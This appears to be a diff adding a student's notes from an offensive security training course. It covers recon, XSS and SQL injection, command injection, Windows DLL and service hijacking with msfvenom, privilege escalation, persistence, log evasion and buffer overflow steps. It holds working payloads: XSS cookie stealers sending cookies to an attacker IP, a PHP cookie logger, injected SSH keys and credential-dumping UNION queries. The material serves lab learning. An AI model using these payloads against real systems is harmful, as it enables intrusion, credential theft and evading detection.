@@ -1,0 +1,1239 @@
+Exploit research
+- Objectives
+   - Understand intial access
+   - Undertsand process to conduct research to pair vulerability to exploit
+   - Identify requirements to accomplish a mission objective
+- Initial Access
+   - What is initial access
+   - What is now the most common method for gaining initial access
+      - Phishing
+   - Other techniques
+      - Stuxnet, web shells, 
+- Intro to Exploit Research
+   - Transition from recon to weaponization
+   - Leverage intelligence/data about network
+   - Pair vulnerabilities to exploits
+   - Align exploits to operational objectives
+- Research
+   - Open sources
+   - Organizational capabilities
+- Capabilities
+   - Mission objectives drive requirements
+      - Collection
+      - Effects
+   - Additional functionality to fulfill requirements
+   - Communications security (COMSEC)
+- Testing
+   - Exploit Development occurs from vulnerability pairing and mission-drivens requirement
+      - Test and verify success
+   - Testing provides a number of benefits
+      - Faster time to breakout of initial foothold
+      - Reduced risk of detection and/or tool failure
+      - Improved recovery times
+- Plan
+   - Procure hardware and software
+   - Assign developer
+   - Assign a tester to develop TTPs and break it
+   - Document testing results
+   - Testing envirnment
+   
+Pen Test Reporting
+10.50.38.18 - Grey Host
+- Penetration Testing 
+    - Phase 1: Mission Definition
+       - Define mission goals and targets
+       - Determine scope of mission
+       - Define RoE
+    - Phase 2: Recon
+       - Information gathering about the target through public sources
+    - Phase 3: Footprinting
+       - Accumulate data through scanning and/or interaction with the target/target resources
+    - Phase 4: Exploitation and Initial Access
+       - Gain an initial foothold on network
+    - Phase 5: Post-Exploitation
+       - Establish persistence
+       - Escalate privileges
+       - Cover your tracks
+       - Exfiltrate target data
+    - Phase 6: Document Mission
+       - Document and report mission details
+ - Penetration Test Reporting
+    - OPNOTES vs Formalized Reporting 
+ - Penetration Test Reporting
+    - Executive Summary
+       - Mission
+       - Scope
+       - parameters
+    - Technical Summary
+       - Who,What,When,Where,Why, and how the pen test was conducted
+    - Reasons to report
+       - Continuity of Operations
+          - So you can pick up where you left off
+          - So someone else can pick up where you left off
+       - Accounting of actions taken
+          - Documentation may be a legal requirement
+          - Prevent repudiation issues if you need to prove actions taken
+       - Ability to Repeat Exact actions
+          - Documenting what did work so it can be repeated 
+       - Troubleshooting and lessons learned
+          - Documenting what didn't work
+    - What to report
+       - Tools used
+       - Timestamps
+       - Success
+       - Failure
+       - Analytic Conclusions
+       - Unexpected Results
+    - Screen Captures
+Recon
+ - Open Source Intelligence
+    - Appropriate Documentation practices
+    - Use of collected data
+    - Collection methods
+ - DoD States:
+    - produced from publicy available information that is collected,exploited, and disseminated in a timely
+      manner to an appropriate audience for addressing a specific intelligence requirement
+ - Documentation
+    - Why is it important
+    - What should we include in documentation
+ - Collection and Use
+    - What do we want to collect
+    - How can it be used in operations
+ - Limitations on Collection
+    - Are there rules that guide our operations and collection parameters
+    - What are important factors when collecting data about a target
+ - Data to Collect
+    - Web Data
+       - cached content,analytics,proxy web application, command line interrogation
+    - Sensitive Data
+       - Business data, profiles, non-profits/charities,business filings, historical and public listings
+    - Publicly Accessible
+       - Physical addresses, phone numbers, email addresses, user names, search engine data, web and traffic cameras, WAP data
+    - Social media
+       - Twitter,Facebook,Instagram,People searches,registery and wish lists
+    - Domain and IP Data
+       - DNS Registration, IP Address Assignments, Geolocation data, Whois
+ - Hyper-Text Markup Language (HTML)
+    - Client-side interpretation
+    - Utilizes elements
+    - Typically redirects to another page for server-side interaction
+    - Cascading Styleshettes (CSS) for page themeing
+ - HTML Scraping script
+"
+  1 #!/usr/bin/python
+  2 
+  3 ##Imports
+  4 import lxml.html
+  5 import requests
+  6 
+  7 #### Grabs the webpage ####
+  8 page = requests.get('http://quotes.toscrape.com')
+  9 ### 127.0.0.1:portnumber or 0.0.0.0:portnumber
+ 10 tree = lxml.html.fromstring(page.content)
+ 11 
+ 12 ### Outlines the tag you want to grab ###
+ 13 #change //small[..] to whatver tag, leave /text() as is
+ 14 results = tree.xpath('//a[@class="tag"]/text()')
+ 15 
+ 16 ### Print it out ###
+ 17 print ('Authors: ',results)
+"
+ - making changes to line 14 changes what you grab
+ 
+ - Advanced Scanning Techniques
+    - Host Discovery
+       - Find hosts that are online
+       - Ping sweep
+    - Host enumeration
+       - Find ports for each host that is online
+       - bannergrabbing
+    - Host Interrogation
+       - Find what service is running on each open/available ports
+ - Sgt. Wilson nmap
+    "
+nmap -Pn -T4 10.50.37.95 -p22,80,8080,8888,2222,4444
+    "
+ - Sgt Wilson ping sweep
+     - for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &);done
+ 
+ - NMAP Scripting Engine
+    - Benefit of scanning with scripts
+    - script managemnet and utilization
+    - usage and examples
+    - Useful scripts
+       - banner.nse
+       - http-enum.nse
+       - smb-os-discovery.nse
+Web Exploitation
+Day 1
+ - Server/Client Realtionship
+    - Synchronous communications between user and services
+    - Not all data is not returned, client only receives what is allowed
+ - HTTP
+    - Request/Response
+       - Various tools to view
+          - tcpdump
+          - wireshark
+          - Developer Console
+    - Methods
+       - Get
+       - Post
+       - Head
+       - Put
+    - Response Codes
+       - 10x = Informational
+       - 2xx = Success
+       - 30x = Redirection
+       - 4xx = Client Error
+       - 5xx = Server Error
+    - Packet headers
+    - Fields
+       - User-Agent
+       - Referer
+       - Cookie
+       - Date
+       - Server
+       - Set-Cookie
+    - Method notes
+       - Get pulls from
+       - Post posts to the server
+       - wget
+       - curl
+       - JavaScript(JS)
+          - Allows website to interact with the client
+             - JavaScript runs on the clients machine
+          - Coded as .JS files, or in-line of HTML
+       - Dev Console
+          - Enumeration
+             - ROBOTS.TXT
+             - Legitimate surfing
+             - Tools:
+                - NSE scripts
+                - Nikto
+                - Burp suite (outside class)
+ - Cross-Site Scripting (XSS) Overview
+    - Insertion of arbitrary code into a webpage, that executes in the browser of visistors
+    - Unsanitized GET,POST,and PUT methods allow JS to be placed on websites
+    - Often found in forums that allow HTML
+    - Reflected XSS
+       - Most common form of XSS
+       - Transient, occurs in error messages or search results
+       - Delivered through intermediate media, such as a link in an email
+       - Characters that are normally illegal in URLs can be Base64 encoded
+       - Example
+          - http://example.com/page.php?name=dXNlcjEyMw
+             - the server will decode as name=abc123
+    - Stored XSS
+       - Resides on vulnerable site
+       - Only requires user to visit page
+          - Useful JavaScript Components
+             - Capturing Cookies
+             - Capturing Keystrokes
+                - bind KEYDOWN and KEYUP
+             - Capturing sensitive data
+    - Server-Side injection
+       - Ability to read/execute outside web servers directory
+       - Uses ../../(Relative paths) in manipulating server-side file path
+    - Malicious File Upload
+       - Server doesn't validate extension or size
+       - Allows for code execution
+       - Once uploaded
+          - Find your file
+          - Call your file
+   - Command Injection
+      - Application on ther server is vulnerable, allowing execution of arbitrary commands
+         - User input not validated
+            - Common example is a SOHO router, with a web page to allow ping
+  - Demo
+     - nmap --script=http-enum.nse
+     - nikto -host 10.50.xx.xx
+     - steal cookies
+  1 <script>document.location="10.50.28.138:8000"+document.cookie;</script>
+  2 
+  3 python3 -m http.server      
+       - Another cookie stealer:
+  1 <?php
+  2 $cookie = $_GET["username"];
+  3 $steal = fopen("/var/www/html/uploads/cookiefile.txt", "a+");
+  4 fwrite($steal, $cookie ."\n");
+  5 fclose($steal);
+  6 ?>
+
+       - To run the uploaded cookie stealer
+          - <script>document.location="http://theSERVERIP/uploads/cookiestealer.php?username="+document.cookie;</script> 
+       
+       
+       
+       - How to send ssh public key using command injection
+          - find the users home directory (user you have control over)
+          - generate your rsa key (ssh-keygen -t rsa -b 4096)
+          - cat .ssh/id_rsa.pub
+          - copy all contents except the username@box
+          - return to command injecton location
+          - execute (;mkdir .ssh) make sure to specify absolute path
+          - execute (;ls -la) to verify the directory was created
+          - execute (;echo "copied rsa" > /var/www/.ssh/authorized_keys)
+          - execute (;cat /var/www/.ssh/authorized_keys) to verify your key was added
+          - when sshing to the box after this execute (ssh -i .ssh/id_rsa username@tgtip)
+       
+ Day 2 SQL
+   - Ojectives
+      - Familiarization with SQL queries
+      - Perform SQL injections
+      - Identify unsanitized input fields
+   - SQL
+      - Structured Query Language - ANSI standard
+      - Additional commands added by vendors
+      - Relational
+   - Standard Commands (all commands end with a ';'
+      - Select = extracts data from a database
+      - Union = Used to combine the result-set of two or more select statements
+      - Use = select the database to use
+      - Update = updates data in a database
+      - Delete = Deletes data from a database
+      - Insert Into = Inserts new data into a database
+      - Create Database = creates a database
+      - Alter Database = Modifies a database
+      - Create table = Creates a new table
+      - Alter table = Modifies a table
+      - Drop table = Deletes a table
+      - Create index = Creates an index (search key)
+      - Drop index = Deletes an index
+      - Demo
+         - show databases; = lists the databases
+         - show tables from session; = shows all tables
+         - select * from session.tires; = shows eveerything in the sessions database and tires table
+         - select tireid,name,cost from session.tires; = queries specific information from the table
+         - use session; = basically cd'ing into a database
+         - select * from tires; = queries tires directly since you are in the sessions DB
+         - show tables; = lists all tables directly in the DB you are in
+         - select * from user; = lists everything from the user table
+   - SQL Injection - Considerations
+      - Requires Valid SQL Queries
+      - Fully patched systems can be vulnerable due to misconfiguration
+      - Input Field Sanitization
+      - String vs. Integer values
+      - Is INFORMATION_SCHEMA database available
+      - Get requests versus POST Request HTTP methods
+   - Unsanitized Vs Sanitized Fields
+      - Unsanitized: input fields can be found using a single quote "'"
+         - Will return extraneous information
+         - ' closes a variable, to allow for additional statements/clauses
+         - may show no errors or generic error (harder injection)
+      - Sanitized: iput fields are checked for items that might harm the database(items are removed,escaped, or turned into a single string)
+      - Validation: checks inputs to ensure it meets a criteria(string doesn't contain "'")
+   - Server-Side query processing
+      - User enters JOHNDOE243 in the name field and PASS1234$ in the pass field
+      - The server side query that would be passed to MySQL from php would be
+         - Before
+            - select id from users where name='$name' AND pass='$pass'
+         - After
+            - select id from users where name='JohnDoe243' and pass='pass1234$'
+   - Example - Injecting ypur statement
+      - User enters TOM' OR 1='1 in the name and pass fields
+         - server-side query would look like
+            - select id from users where name='tom' or 1='1' and pass='tom' or 1='1'
+   - SQL Injection Validation Demo
+      - once you find the vulnerable field document it
+      - post is sending it through the creds box
+      - get is enetering something like " /login.php?username=Admin&passwd=user"
+   - Union Demo
+      - once you determine the post/get vulnerabilities make note of them
+      - then write a union statement "10.50.42.112/uniondemo.php?Selection=2 union select 1,2,3"
+      - query the information schema "http://10.50.42.112/uniondemo.php?Selection=2%20union%20select%20table_schema,%20table_name,%20column_name%20from%20information_schema.columns"
+      - selection=2 union select table_schema,table_name,column_name from information_schema.columns
+      
+      
+   - SQL by the numbers (MySQL)
+      - Browse website to find 
+      
+      - Find the number of columns (union select 1,2,3)
+      - Golden Statement = (union select table_schema,table_name,column_name from information_schema.columns)
+         - 1 table_schema
+         - 2 table_name
+         - 3 column_name
+      - Navigate to custom database(union select id,pass,name from session.user)
+   - Stacking Statements
+      - chaining multiple statements together using a semi-colon ';'
+      - select * from user where id='Johnny';DROP TABLE Customers; --'
+Reverse Engineering
+ xfreerdp /v:10.50.23.183 /u:student /p:password /size:1920x1000 +clipboard
+ - X86_64 Assembly
+    - There are 16 general purpose 64-bit registers
+       - %rax is the first return register
+       - %rbp is the base pointer that keeps track of the base of the stack
+       - %rsp is the stack pointer that points to the top of the stack
+       - %rip is the instruction pointer (contains the next instruction)
+    - You will see arguments passed to functions as something like:
+       - [%ebp-0x8]
+    - Common terms
+       - HEAP is memory that can be allocated and deallocated
+       - STACK is a contiguous section of memory used for passing arguments
+       - GENERAL REGISTER is a multipurpose register that can be used by either programmer or user to store data or a memory location address
+       - CONTROL REGISTER is a processor register that changes or controls the behavior of a CPU
+       - FLAGS REGISTER contains the current state of the processor
+    - Common instruction pointers
+       - MOV - move source to destination
+       - PUSH - push source onto stack
+       - POP - Pop top of stack to destination
+       - INC - Increment source by 1
+       - DEC - Decrement source by 1
+       - ADD - Add source to destination
+       - SUB - Subtract source from destination
+       - CMP - Compare 2 values by subtracting them and setting the %RFLAGS register. ZeroFlag set means they are the same.
+       - JMP - Jump to specified location
+       - JLE - Jump if less than or equal
+       - JE - Jump if equal
+       - JZ - Jump if zero
+       - JNZ - Jump if not zero
+    - Reverse Engineering Workflow (Software)- When conducting don't skip steps even if they seem unecessary
+       - Static
+          - Determine the file type - Is it an .exe? What environment is it designed to run in?(OS,CPU,Architecture,etc)
+          - Determine if file is packed/compressed
+          - Find plain text ascii and unicode string (use strings)
+          - View imports/exports to get a hint of functionality/calls
+          - Look for encrypted sections of the binary
+       - Behavioral
+          - Take a snapshot of the analysis environment - Important! Taking a snapshot on an OpenStack
+            VM takes a substantial amount of time.
+          - Take a snapshot of critical configurations of the analysis environment. (Things like the registry,
+            important directories, etc)
+          - Launch realtime analysis tools (Things like procmon and fakenet)
+          - Execute and interact with the object/binary while taking note of observations
+          - Stop the binary and view how it affected critical configurations (registry, files, etc) by
+            comparing to previous snapshots
+          - Analyze results of realtime analysis tools (did fakenet catch network calls, did procmon show it
+            writing to a file, etc)
+       - Dynamic
+          - Execute binary in a debugger
+          - Step through binary, setting breakpoints as approriate
+          - Continuously rerun the binary and edit it’s parameters through the debugger, as you learn
+            more about how it works
+          - Document all observations and modifications
+       - Disassembly
+          - Disassemble binary in IDA, Ghidra, or other disassembler
+          - Use notes to find artifacts within the disassembly
+          - Find a good spot to work from within the binary. Then quickly browse from the top to the
+            bottom of the disassembly to view the overall flow of the disassembly
+          - Rename variables and functions as appropriate when quickly scanning top to bottom of the disassembly.
+          - Work your way from the bottom to the top - if there are two outcomes choose the one you want
+            to end at, then work your way up from there to determine what needs to happen for the
+            program to flow to the desired outcome.
+       - Document Findings
+          - Document all discovered binary traits, capabilities, and behaviors to include the conditions they
+            must run under.
+          - Document potential uses for the binary.
+          - Create mitigations for the binary if it is malicious.
+          - Create signatures and indicators of compromise to detect the binary in the future.
+          - Document and save the tools, scripts, code, methods used to analyze the software to better
+            analyze related software in the future
+          - Document proof of concept for exploitation of the binary if it is found to be vulnerable and a
+            potential target. For example, if the binary is running on an adversary network, or if a friendly
+            network may be using the binary
+    - Portable Executable Patching/Software Analysis
+       - Perform DEBUGGING and DISASSEMBLY
+       - Find the SUCCESS/FAILURE
+       - Adjust INSTRUCTIONS
+       - Apply Patch and Save
+       - Execute Patched Binary
+    - Demo
+       - Check what kind of file it is
+       - Execute the file
+       - Make note of what the program does when it executes
+       - Drop the file into IDA Freeware or Ghidra
+       - In IDA if you see ebp + a variable typically that var is user input
+       - param_1 in Ghidra is more than likely user input
+       -
+ - Patching
+    - Changing the assembly code to make it do what you want to do
+Post Exploitation
+- Pivoting and Redirection
+    - Control sockets
+    - Enumeration
+    - Exfiltration
+    - What is pivoting? Why is it important?
+       - Makes the op non attributable
+       - Looks like your connection is coming from another location
+       - Allows access to something that we may nor hav direct access to due to firewalls, routers, etc.
+       - Can make or break an operation,connection loss,malware,active admin,unreliable,etc.
+       - Reliability, the pivot machine will be directly accessed, and COULD be attributable 
+         if the proper precautions aren’t taken (encryption, VMs, nat and pat)
+    - What is a system used for redirection?
+       - A remote machine that is very trustworthy and reliable, used to pivot from
+    - How much thought should be put into selecting a system for redirection?
+       - Geographical Location
+       - State of the machine
+       - Uptime
+       - Basically it’s overall reliability
+    - Command demo Linux 
+       - cat /etc/passwd
+          - username:hashed password:userid:group userid:comments:homedir:default shell
+       - cat /etc/shadow
+          - contains encrypted user password
+       - last
+          - displays information about the last user to logon
+       - who
+          - displays who is currently logged on
+       - whoami
+          - shows who you are currently logged in as
+       - groups
+          - displays what groups the user is part of
+       - id
+          - pulls up uid,guid,and groups for the user who ran the command
+       - ps -elf
+          - displays current running processes in long format
+          - -aux
+             - gives us the process tree
+       - pstree
+          - gives the process listing in a tree format
+       - sudo lsof
+          - list of open files on the system
+       - chkconfig
+          - SysV
+       - systemctl list-units --type=service
+          - SystemD service listings
+          - adding a "| grep running" will list only running services
+       - ifconfig -a
+          - same as ip a but a little bit easier to read
+       - netstat
+          - list connections to a machine
+       - arp -an
+          - allows us to view the arp cache
+       - ip route
+          - gives us our routing table
+          - route
+             - does the same thing
+          - netstat -r
+             - does the same thing
+       - cat /proc/cpuinfo
+          - gives us information about the cpu
+       - lsmod
+          - lists kernel modules
+       - cat <file> | tr 'a-zA-Z0-9' 'b-zA-Z0-9a' > shifted.txt
+          - shifts the characters in the file and saves it to a different file
+       - cat file | base64
+          - converts the file to base64 encryption
+       - scp <source> <destination>
+       - ncat --ssl <ip> <port> < <file>
+    - Command demo Windows
+       - net user
+          - Shows users on the box
+       - get-localuser
+          - Shows users on the box PS
+       - get-localgroup
+          - Shows all the groups on the box PS
+       - get-localuser | get-member
+          - shows what we can do with the output with select PS
+       - tasklist /v
+          - shows running processes
+       - get-process
+          - shows running processes PS
+       - get-process | where {$_.sessionid -eq 1}
+       - tasklist /svc
+          - shows services
+       - get-service | where {$_.status -eq "running"}
+          - shows services that are running PS
+       - net start
+          - shows startup services
+       - wmic service list status
+          - running services CMD
+       - ipconfig /all
+          - view info about the NICs
+       - netstat -anob
+          - all listening ports
+       - wmic net use list
+          - CMD
+       - net view
+          - CMD
+       - arp -a
+          - displays the ARP cache
+       - route print
+          - prints the routing table
+       - systeminfo
+          - gives a lot of info about the box
+       - date
+          - allows us to enumerate where the pc is
+       - obfuscation
+          - type <file> | %{$_ -replace 'a','b' -replace 'b','c' -replace 'c', 'd'} > translated.out
+          - certutil -encode <file> encoded.b64
+ - SSH Multiplexing
+    - cd .ssh
+    - mkdir cm or cd to cm
+    - ssh -M -S ~/.ssh/cm/student@10.50.38.18:22 student@10.50.38.18
+       - the -M is the master -S is the slave/socket the filename is the connection
+    - ssh -M -S ~/.ssh/cm/grey -o "ControlPersist=10m" student@10.50.38.18
+    - ssh -S ~/.ssh/cm/grey greyhost
+    - ssh -O forward -L1111:10.100.28.48:80 -S ~/.ssh/cm/gray nla
+    - ssh -O forward -L2222:10.100.28.40:80 -S ~/.ssh/cm/gray another
+    - ssh -O cancel -L1111:10.100.28.48:80 -S ~/.ssh/cm/gray nla
+       - clears the connection
+   - ssh -O cancel -S ~/.ssh/cm/gray another
+      - gracefully closes the socket
+   - ssh -O exit ~/.ssh/cm/gray another(placeholder)
+      - closes the connection
+   - ssh -O forward -L2222:192.168.28.111:2222 -S ~/.ssh/cm/grey placeholder
+   - ssh -M -S ~/.ssh/cm/T1 comrade@0.0.0.0 -p2222 # creates a master socket to the original slave
+   - scp -o "ControlPath=~/.ssh/cm/grey" a:/home/student/func .
+   - ssh -S ~/.ssh/cm/grey 01 -D 9050
+
+Linux Exploitation
+ - Privilege Escalation
+    - What are the techniques and processes
+       - Is there  particular order
+       - is there anything else you should be doing while on the box
+    - SUDO
+       - Why should this be used
+       - What commands can you run as sudo
+       - SUDO Gotchas
+          - Commands that can access the contents of other files
+          - Commands that download files
+          - Commands that execute other files(editors)
+          - Dangerous commands
+    - SUID/SGID
+       - What is SUID/SGID
+       - Why should you consider it for priv esc
+       - What commands should you run
+       - Capabilities
+          - What are capabilities
+          - Why should you consider it for priv esc
+          - What commands should you run
+       - Demo
+          - Run ls -lhisa
+          - run find / -type f -perm /4000 -ls 2>/dev/null
+             - 4000 finds SUID
+             - 2000 finds GUID
+             - 6000 finds both
+          - we can use gtfobins to find a way to escalate
+          - 
+    - Insecure permissions
+       - CRON
+          - What is it
+          - Why should it be considered
+          - What commands should be run
+          - Evaluate crontabs to look at what is running to potentially modify the script it's calling to esc privs
+       - World-Writeable files and dirs
+          - Why should this be considered for priv esc
+          - what commands should be run
+          - /tmp and /var/tmp
+             - this can be used to put your tools in here if necessary
+             - If you are trying to copy a file from a more secure location to scp it it could be stored here
+       - Dot'.' in path
+          - Why should you consider it for privilege escalation
+          - What commands should you run
+          - if the $PATH has a dot in it this allows you to create your own script to esc privs
+       - Demo
+          - PATH=.:$PATH
+          - check crontab as well as /etc/cron
+          - 
+          - 
+    - Vulnerable Software and services
+       - Why should it be considered for priv esc
+       - What commands should you run
+    - Unpatched Kernel Vulnerabilities
+       - Why should this be considered for rpiv esc
+       - What commands should be run
+    - Demo
+       - 
+       - 
+       - 
+ 
+ - Persistence 
+    - Adding or hijacking a user account
+       - Adding vs hijacking a user account
+       - User account considerations
+       - How should you access it
+       - Demo
+          - 
+          - 
+          - 
+    - Boot Process Persistence
+       - Where and how do you implement
+       - Why should this be considered for persistence
+       - How should it be accessed
+       - Demo
+          - 
+          - 
+          - 
+    - Cron Job persistence
+       - System vs user CRON
+       - Why should this be considered for persistence
+       - How should it be accessed
+       - Demo
+          - 
+          - 
+          - 
+    - Kernel Module backdoors
+       - Why should you consider it for persistence
+       - How should you access it
+       - Demo
+          - 
+          - 
+          - 
+ - Covering your tracks
+    - Plan
+       - Prior,after,before(know the system)
+          - What will happen if I do X(What logging)
+          - Checks(Where are things)
+          - Hide(File locations,names,times)
+       - When do you start covering your tracks
+    - Artifacts
+       - what are they
+    - System usage
+       - Where to work from on the remote system?
+       - Are system resources important
+    - NIX-ism
+       - First thing: unset histfile
+       - Need to be aware of init system in use
+          - SystemD, to name a few
+          - Determines what commands to use and logging structure
+   - Ways to determie init type
+      - ls -latr /proc/1/exe
+      - stat /sbin/init
+      - man init
+      - init --version
+      - ps 1
+   - Auditing SystemV : System level logs
+      - ausearch -p 22
+      - ausearch -m USER_LOGIN -sv no
+      - ausearch -ua edwards -ts yesterday -te now -i
+   - SystemD : System level logs
+      - journalctl _TRANSPORT=audit
+      - journalctl _TRANSPORT=audit | grep 603
+   - Logs for covering tracks
+      - auth.log/secure
+         - Logins/authentications
+      - lastlog
+         - Each users' last successful login time
+      - btmp
+         - Bad login attempts
+      - sulog
+         - Usage of SU command
+      - utmp
+         - Currently logged in users (W command)
+      - wtmp
+         - Permanent record on user on/off
+   - Working with logs
+      - file /var/log/wtmp
+      - find /var/log -type f -mmin -10 2>/dev/null
+      - journalctl -f -u ssh
+      - journalctl -q SYSLOG_FACILITY=10 SYSLOG_FACILITY=4
+
+ - Remote Logging
+    - Rsyslog
+       - Newer Rsyslog refrences /etc/rsyslog.d/* for settings/rules
+       - Older versions only use /etc/rsyslog.conf
+       - find out
+          - grep "IncludeConfig" /etc/rsyslog.conf
+          
+          
+ Windows Exploitation
+ - Modes and Levels
+    - Kernel Mode and User Mode
+    - Privileged vs Unprivileged
+ - Windows access control model
+    - Access Tokens
+       - Security identifer (SID) associations and token associations
+    - Security Descriptors
+       - DACL
+       - SACL System level
+       - ACEs
+ - DLL Search Order
+    - Executables check the following locations (in successive order) 
+       - HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs
+       - The directory the application was run from
+       - The directory specified in in the C+ function GetSystemDirectory()
+       - The directory specified in the C+ function GetWindowsDirectory()
+       - The current directory
+- Windows integrity mechanism
+   - Untrusted : Anonymous SID access tokens
+   - Low : Everyone SID access token (World)
+   - Medium : Authenticated Users
+   - High : Administrators
+   - System : System services (LocalSystem, LocalService, NetworkService)
+- User Account Control(UAC)
+   - Always Notify
+   - Notify me only when programs try to make changes to my computer
+   - Notify me only when programs try to make changes to my computer(do not dim my desktop)
+   - Never notify
+   - Demo:Checking UAC Settings
+      - reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+- AutoElevate Executables
+   - Requested Execution levels
+      - asInvoker
+      - highestAvailable
+- Priv Esc
+- Scheduled Tasks & Services
+   - Write Permissions
+   - Non-Standard Locations
+   - Unquoted Executable Paths
+   - Vulnerabilities in executables
+   - Permissions to run as system
+   - Demo: Finding vulnerable scheduled tasks
+      - schtasks /query /fo LIST /v | select-string -Pattern "Task"
+      - procmon -accepteula
+- DLL Hijacking
+   - Identify vulnerability
+   - Take advantage of the default search order for DLLS
+   - NAME_NOT_FOUND present in executables system calls
+   - Validate permissions
+   - Create and transfor Malicious DLL
+   - Demo : Finding vulnerable services
+      - wmic service list full
+      - sc query
+      - services.msc
+         - look for null or bootleg descriptions
+   - Demo: DLL Hijacking
+      - Identify Vulnerability
+      - Validate permissions
+      - Validate executable paths
+      - Replace with malicous file
+   - schtasks /query /fo LIST /v
+   - schtasks /query /fo LIST /v | Select-String -Pattern "Task To Run" -CaseSensitive -Context 0,6
+   - C:\Users\student\exercise_2\putty.exe
+   - Run: sigcheck c:\users\student\exercise_2\putty.exe
+   - Run: icacls "c:\users\student\exercise_2"
+   - msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f dll > WIMM.dll
+   - Transfer the DLL to the target machine using one of the following methods:
+      - scp the dll from linux to target machine
+   - Put the retrieved DLL in the same location as the vulnerable Putty executable
+      - Run: copy "PATH OF MALICIOUS DLL" "c:\users\student\exercise_2\ntmarta.dll"
+   - Allow for Putty to execute with scheduled task
+- Vulnerable services
+   - Find vulnerable services
+      - wmic service list full
+      - services.msc
+      - sc.exe qc <service name>
+      - for /f "tokens=2 delims='='" %a in ('wmic service get PathName /FORMAT:LIST^|findstr /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
+   - Check permissions
+      - icacls "C:\Program Files\7-Zip\"
+      - icacls "C:\Program Files\7-Zip\7z.exe"
+   - Identify and document the service information associated with the path
+      - From CMD: wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\\" | finstr /i "7z.exe"
+         - path: C:\Program Files\7-Zip\
+         - service name: testservice2
+   - Exploiting the service
+      - msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\\Users\\DemoAdmin\\Desktop\\whoami.txt' -f exe > 7z.exe
+      - create a backup of the 7z.exe file on the target system
+      - replace the original 7z.exe with the malicous 7z.exe
+         - if using a reverse shell payload setup a netcat listener
+         - start the service
+         - verify it's running
+         - tasklist /FI "IMAGENAME eq 7z.exe"
+         
+ - Persistance locations
+    - Sch tasks
+    - Run keys (HKLM/HKU)
+    - psprofiles
+ - Logging Audits
+    - auditpol /get /category:*
+    - auditpol /get /category:* | findstr /i "success failure"
+    - Important Microsoft event IDs
+       - 4624/4625 Successful/failed login
+       - 4720 Account created
+       - 4672 Administrative user logged on
+       - 7045 Service created
+    - wevtutil el
+    - wmic ntevent where "logfile="<LOGNAME>" list full
+    - Get-Eventlog -list
+    - storage location: C:\windows\system32\config\
+    
+    
+QRG
+Reconnaissance-----------------------------------------------------------------------------------
+ - Hyper-Text Markup Language (HTML)
+    - Client-side interpretation
+    - Utilizes elements
+    - Typically redirects to another page for server-side interaction
+    - Cascading Styleshettes (CSS) for page themeing
+ - HTML Scraping script
+"
+  1 #!/usr/bin/python
+  2 
+  3 ##Imports
+  4 import lxml.html
+  5 import requests
+  6 
+  7 #### Grabs the webpage ####
+  8 page = requests.get('http://quotes.toscrape.com')
+  9 ### 127.0.0.1:portnumber or 0.0.0.0:portnumber
+ 10 tree = lxml.html.fromstring(page.content)
+ 11 
+ 12 ### Outlines the tag you want to grab ###
+ 13 #change //small[..] to whatver tag, leave /text() as is
+ 14 results = tree.xpath('//a[@class="tag"]/text()')
+ 15 
+ 16 ### Print it out ###
+ 17 print ('Authors: ',results)
+"
+ - making changes to line 14 changes what you grab
+ 
+ - Scanning
+    - Pingsweep
+       - for i in {1..254}; do (ping -c 1 192.168.1.$i | grep "bytes from" &);done
+    - nmap scan for open ports
+       - nmap -Pn -T4 10.50.37.95 -p22,80,8080,8888,2222,4444
+       - Useful scripts
+          - banner.nse
+          - http-enum.nse
+          - smb-os-discovery.nse       
+    - banner grab open ports
+       - enum service running
+    
+
+Exploit Research-----------------------------------------------------------------------------------
+
+
+Web Exploitation-----------------------------------------------------------------------------------
+ - Various tools to view
+    - tcpdump
+    - wireshark
+    - Developer Console
+ - Fields
+    - User-Agent
+    - Referer
+    - Cookie
+    - Date
+    - Server
+    - Set-Cookie
+- SQL Injection
+   - Standard Commands (all commands end with a ';'
+      - Select = extracts data from a database
+      - Union = Used to combine the result-set of two or more select statements
+      - Use = select the database to use
+      - Update = updates data in a database
+      - Delete = Deletes data from a database
+      - Insert Into = Inserts new data into a database
+      - Create Database = creates a database
+      - Alter Database = Modifies a database
+      - Create table = Creates a new table
+      - Alter table = Modifies a table
+      - Drop table = Deletes a table
+      - Create index = Creates an index (search key)
+      - Drop index = Deletes an index
+      
+   - SQL by the numbers (MySQL)
+      - Browse website to find 
+      
+      - Find the number of columns (union select 1,2,3)
+      - Golden Statement = (union select table_schema,table_name,column_name from information_schema.columns)
+         - 1 table_schema
+         - 2 table_name
+         - 3 column_name
+      - Navigate to custom database(union select id,pass,name from session.user)
+   - Stacking Statements
+      - chaining multiple statements together using a semi-colon ';'
+      - select * from user where id='Johnny';DROP TABLE Customers; --'
+      
+- How to send ssh public key using command injection
+    - find the users home directory (user you have control over)
+    - generate your rsa key (ssh-keygen -t rsa -b 4096)
+    - cat .ssh/id_rsa.pub
+    - copy all contents except the username@box
+    - return to command injecton location
+    - execute (;mkdir .ssh) make sure to specify absolute path
+    - execute (;ls -la) to verify the directory was created
+    - execute (;echo "copied rsa" > /var/www/.ssh/authorized_keys)
+    - execute (;cat /var/www/.ssh/authorized_keys) to verify your key was added
+    - when sshing to the box after this execute (ssh -i .ssh/id_rsa username@tgtip)    
+    
+    
+Reverse Engineering-----------------------------------------------------------------------------------
+
+
+Exploit Development Testing-----------------------------------------------------------------------------------
+ - Demo
+    - gdb func
+    - analyze for vulnerabilities (pdisass main)
+    - run - executes the program
+    - Look at the EIP
+    - Utilize wiremask.eu to figure out the offset of the EIP
+    - build a python script to match the eip
+    - run <<< $(python /home/student/secutiry/demoexploit.py)
+    - the triple carrot is only used when user input is needed.
+      If it requires a parameter the triple carrots are not needed.
+    - The program will have a lot of empty overhead
+    - Process to verify that we can jmp to the top of the pointer
+       - Looking for valid jmp esp
+       - run "env - gdb" to run gdb without peda
+       - show env
+       - clear out whatever is in there
+       - show env (verify it's clear)
+       - file "target file name"
+       - run
+       - info proc map
+       - look for a valid jmp esp
+       - find /b (start addr from right below heap), (end addr from right above the stack), 0xff(jmp), 0xe4(esp)
